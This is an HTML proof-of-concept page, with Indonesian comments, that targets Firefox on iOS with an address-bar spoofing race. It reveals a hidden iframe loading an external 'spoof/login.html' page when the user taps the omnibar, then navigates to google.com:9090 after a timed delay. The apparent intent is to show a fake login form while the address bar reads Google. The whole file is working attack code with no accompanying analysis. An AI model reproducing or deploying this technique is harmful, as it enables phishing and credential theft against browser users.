<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Firefox iOS Omnibar + Google Race PoC</title>
<style>
body {
  margin:0;
  font-family:-apple-system, BlinkMacSystemFont, system-ui;
  background:#f5f5f7;
}
iframe {
  width:100%;
  height:220px;
  border:1px solid #ddd;
  border-radius:12px;
  margin-top:16px;
  display:none; /* disembunyikan awal */
}
.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
  text-align:center;
}
</style>
</head>
<body>

<iframe
  id="childFrame"
  src="https://cnfdnfial-ops.github.io/spoof/login.html"
  sandbox="allow-scripts allow-forms allow-same-origin">
</iframe>

<div class="notice">
  Firefox iOS — tap omnibar untuk trigger iframe → navigasi ke Google
</div>

<script>
const iframe = document.getElementById('childFrame');
let iframeShown = false;
let lastHeight = window.innerHeight;

function tryShowIframe() {
  if (iframeShown) return;

  // deteksi viewport mengecil → kemungkinan tap omnibar
  if (window.innerHeight < lastHeight) {
    iframe.style.display = 'block';
    iframeShown = true;

    // Step 2: navigation race ke Google setelah delay kecil
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          location.href = 'https://google.com:9090';
        }, 80);
      });
    });
  }
  lastHeight = window.innerHeight;
}

// event umum yang muncul saat tap omnibar di iOS
window.addEventListener('resize', tryShowIframe);
window.addEventListener('scroll', tryShowIframe);
window.addEventListener('focus', tryShowIframe);
</script>

</body>
</html>
